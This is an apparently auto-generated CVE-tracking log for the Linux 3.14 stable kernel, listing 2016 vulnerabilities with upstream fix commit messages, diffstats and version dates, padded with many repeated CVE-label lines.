Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
